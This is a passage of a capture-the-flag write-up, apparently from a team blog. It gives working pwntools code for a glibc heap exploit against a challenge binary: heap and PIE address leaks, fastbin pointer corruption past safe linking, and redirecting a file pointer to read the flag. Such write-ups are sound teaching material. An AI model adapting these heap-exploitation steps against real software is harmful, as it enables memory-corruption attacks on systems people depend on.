+<span class="line"><span style="color:#DBD7CAEE">    r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">4</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Please enter a fortune index</span><span style="color:#C99076">\n</span><span style="color:#C98A7D"> > </span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#B8A965">str</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">())</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D77"> '</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    s </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#666666">(</span><span style="color:#4C9A91">5</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00\x00\x00</span><span style="color:#C98A7D77">'</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">-----------------------------------------</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 4096</span></span>
+<span class="line"><span style="color:#DBD7CAEE">heap_base </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> read_heap_leak</span><span style="color:#666666">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">)</span></span>
+<span class="line"></span></code></pre>
+<p>We also need a leak of the program load address, because it is PIE and we will
+need this leak to know where <code>.data</code> is in memory. Remember that each <code>struct cookie_fortune</code> contains a pointer to its own entry in <code>c</code>: <code>free()</code>d cookie
+fortune buffers still contain it. We will allocate a 0x70-sized buffer with
+<code>ask_8ball</code> where there was a <code>cookie_fortune</code> and we will fill the chunk until
+offset 0x68. When printing it, we will receive 0x68 bytes (our input) followed
+by the address of an entry in <code>c</code>.</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD"># Will pick up first available chunk in the tcachebin, i.e. cookie 13</span></span>
+<span class="line"><span style="color:#DBD7CAEE">create_ball</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#666666"> (</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">68</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 17</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">))</span></span>
+<span class="line"><span style="color:#DBD7CAEE">section_data_address </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> read_binary_leak</span><span style="color:#666666">(</span><span style="color:#4C9A91">13</span><span style="color:#666666">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">170</span></span>
+<span class="line"></span></code></pre>
+<p>Now we will allocate a <code>cookie_fortune</code> from the top chunk, free it and
+immediately consolidate that with the top chunk with the <code>scanf()</code> trick
+explained above.</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">delete_cookie</span><span style="color:#666666">(</span><span style="color:#4C9A91">15</span><span style="color:#666666">)</span><span style="color:#758575DD"> # Fills up the tcache again</span></span>
+<span class="line"><span style="color:#DBD7CAEE">create_cookie</span><span style="color:#666666">()</span><span style="color:#758575DD">   # Ends up in the top chunk</span></span>
+<span class="line"><span style="color:#DBD7CAEE">delete_cookie</span><span style="color:#666666">(</span><span style="color:#4C9A91">32</span><span style="color:#666666">)</span><span style="color:#758575DD"> # Ends up in fastbins</span></span>
+<span class="line"><span style="color:#DBD7CAEE">r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">5</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">400</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#DBD7CAEE">r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">-----------------------------------------</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
+<span class="line"></span></code></pre>
+<p>We empty the tcachebin for size 0x80 because we will need to allocate 8-ball
+user input buffers from the top chunk. The first buffer allocated now from the
+tcache will be at offset 0xe80 from the heap base.</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">7</span><span style="color:#666666">):</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    create_ball</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./flag.txt</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#758575DD"># +17 because "Oh Magic 8 Ball, " prepended to our input</span></span>
+<span class="line"><span style="color:#DBD7CAEE">flag_txt </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> heap_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">e80</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 17</span></span>
+<span class="line"></span></code></pre>
+<p>We finally allocate our 0x10 user input buffer with <code>store_lucky_num()</code> where
+<code>c[32].this</code> is still pointing. The 8-ball buffer allocated right after that is
+used to fix <code>c[32].this->my_entry</code>: otherwise <code>delete_cookie</code> will detect
+corruption. <code>c[32].this->my_entry</code> should point at <code>&#x26;c[32]</code>, i.e. <code>c + 32 * 0x10</code>, i.e. <code>section_data_address + 0xA0 + 32 * 0x10</code>.</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">create_lucky_number</span><span style="color:#666666">()</span><span style="color:#758575DD"> # Ends up at c[32].this</span></span>
+<span class="line"><span style="color:#DBD7CAEE">create_ball</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">fit</span><span style="color:#666666">({</span></span>
+<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">68</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 17</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">section_data_address </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">A0</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 32</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#666666">}))</span></span>
+<span class="line"></span></code></pre>
+<p>Now we free cookie 32 and corrupt its forward pointer. We want the next chunk to
+start at <code>.data + 0x30</code>, where the pointer to <code>"./oracle.txt"</code> is stored.
+Therefore, accounting for chunk metadata, the fastbin forward pointer must point
+at <code>.data + 0x20</code>. We have to apply the safe linking mask. We are lucky enough
+not to have any alignment issues with this address, because <code>.data + 0x28</code>
+contains the quadword <code>0x21</code> that matches exactly the size of our chunks.</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">delete_cookie</span><span style="color:#666666">(</span><span style="color:#4C9A91">32</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#DBD7CAEE">protect_mask </span><span style="color:#666666">=</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">heap_base </span><span style="color:#CB7676">>></span><span style="color:#4C9A91"> 12</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 1</span></span>
+<span class="line"><span style="color:#DBD7CAEE">update_lucky_number</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">protect_mask </span><span style="color:#CB7676">^</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">section_data_address </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#666666">)))</span></span>
+<span class="line"></span></code></pre>
+<p>We still have to consume one fastbin still with <code>get_lucky_num</code> and then we will
+overwrite the target pointer without messing up the next quadword.</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">get_lucky</span><span style="color:#666666">()</span></span>
+<span class="line"><span style="color:#DBD7CAEE">sign</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">flag_txt</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x0b</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
+<span class="line"></span></code></pre>
+<p>Now if you choose option 6 for a few times at the menu you will read a random
+line from <code>./flag.txt</code>!</p>
+<p>Many thanks to Gabriele Digregorio and to Lorenzo Binosi who wrote the exploit
+with me!</p>  </div> </article> </main> <footer data-astro-cid-sz7xmlte>
+&copy; 2024 Tower of Hanoi. All rights reserved.
+<div class="social-links" data-astro-cid-sz7xmlte> <a href="https://twitter.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/twitter" data-astro-cid-sz7xmlte><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Haoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/github" data-astro-cid-sz7xmlte><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-sz7xmlte> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-sz7xmlte></path> </svg> </a> </div> </footer>  </body></html>
